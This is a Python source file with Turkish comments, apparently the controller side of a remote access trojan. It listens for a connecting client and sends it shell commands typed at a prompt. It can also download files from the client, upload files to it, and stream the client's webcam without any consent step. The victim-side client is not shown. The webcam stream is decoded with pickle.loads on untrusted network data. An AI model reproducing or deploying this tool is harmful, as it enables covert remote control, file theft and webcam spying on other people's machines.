import socket
import cv2, pickle, struct

HOST = "0.0.0.0"
PORT = 12345
BUFFER = 1024 # mesajların/paketlerin maksimum boyutu.(1KB) Dilediğimiz gibi artırabiliriz.

pport = PORT

# separator string'i tek seferde iki mesaj gönderirken/alırken, iki mesajı birbirinden ayırmak için kullanılır
SEPARATOR = "<sep>"

# Socket oluşturma
baglanti = socket.socket()

# Socket'i yukarıda belirlediğimiz ip ve port'a atıyoruz.
baglanti.bind((HOST, PORT))

# Bağlantı dinleme - listen(sayı) sayı= kabul edilecek maksimum bağlantı sayısı
baglanti.listen(5)
print(f"{HOST}:{PORT} olarak yeni bağlantılar dinleniyor...")

# bağlanma denemesini/isteğini kabul etme
client_socket, client_address = baglanti.accept()
print(f"{client_address[0]}:{client_address[1]} Bağlandı!")

# İstemcinin mevcut çalışma dizinini öğreniyoruz
mevcut_dizin = client_socket.recv(BUFFER).decode()
print("[+] Çalışma dizini: ", mevcut_dizin)

while True:
    # Komut satırına yazdığımız komutu alıyoruz
    command = input(f"{mevcut_dizin} $> ")

    if not command.strip():
        continue # Boş komut gönderilirse programa döngünün başına dönmesini söylüyoruz
    
    # İstemciye komutu gönderiyoruz
    client_socket.send(command.encode())

    if command.lower() == "exit":
        break # komut exit ise döngüyü sonlandırıyoruz.

    # Dosya indirme
    if command.lower() == "indir":
        dosya_ismi = input("Dosyanın adını girin: ")
        client_socket.send(dosya_ismi.encode()) # istediğimiz dosyanın adını karşıya gönderdik.
        
        file = open(dosya_ismi, "wb") # dosyayı oluşturduk

        while True:
            data = client_socket.recv(1024)
            if not data:
                file.close()
                print("Dosya aktarımı bitti.")

                baglanti.close()
                pport += 1
                baglanti = socket.socket()
                baglanti.bind((HOST, pport))
                baglanti.listen(1)
                client_socket, client_address = baglanti.accept()
                mevcut_dizin = client_socket.recv(BUFFER).decode()
                break
            file.write(data)
        continue

    # Dosya gönderme
    if command.lower() == "gonder":
        dosya_ismi = input("Dosyanın lokasyonunu/adını girin: ")

        client_socket.send(dosya_ismi.encode()) # Göndereceğimiz dosyanın isim bilgisini karşı tarafa ilettik
        
        try:
            file = open(dosya_ismi, "rb") # dosyayı açtık
            data = file.read() # veriyi okuduk
            client_socket.send(data) # dosyayı gönderdik
            file.close() # dosyayı kapattık

            client_socket.close()
            baglanti.close()
            pport += 1
            baglanti = socket.socket()
            baglanti.bind((HOST, pport))
            baglanti.listen(1)
            client_socket, client_address = baglanti.accept()
            mevcut_dizin = client_socket.recv(BUFFER).decode()
            print("Dosya aktarımı bitti.")
            continue
        except:
            print("Böyle bir dosya yok./Bir hata oluştu.")
            continue

        

    # Webcam izleme
    if command.lower() == "webcam_izle":
        wdata = b""
        payload_size = struct.calcsize("Q")
        while True:
            client_socket.send("devam".encode())

            while len(wdata) < payload_size:
                packet = client_socket.recv(4*1024) # 4KB
                if not packet: break
                wdata+=packet
            packed_msg_size = wdata[:payload_size]
            wdata = wdata[payload_size:]
            msg_size = struct.unpack("Q",packed_msg_size)[0]

            while len(wdata) < msg_size:
                wdata += client_socket.recv(4*1024)
            frame_data = wdata[:msg_size]
            wdata  = wdata[msg_size:]
            frame = pickle.loads(frame_data)
            cv2.imshow("webcam izleniyor",frame)
            key = cv2.waitKey(1) & 0xFF
            if key  == ord('q'):
                break

        cv2.destroyAllWindows()
        cv2.waitKey(1)

        client_socket.send("quit".encode())
        baglanti.close()
        pport += 1
        baglanti = socket.socket()
        baglanti.bind((HOST, pport))
        baglanti.listen(1)
        client_socket, client_address = baglanti.accept()
        mevcut_dizin = client_socket.recv(BUFFER).decode()
        continue

    # Komut sonuçlarını alıyoruz
    output = client_socket.recv(BUFFER*4).decode()

    results, mevcut_dizin = output.split(SEPARATOR)

    # sonuçları yazdırıyoruz
    print(results)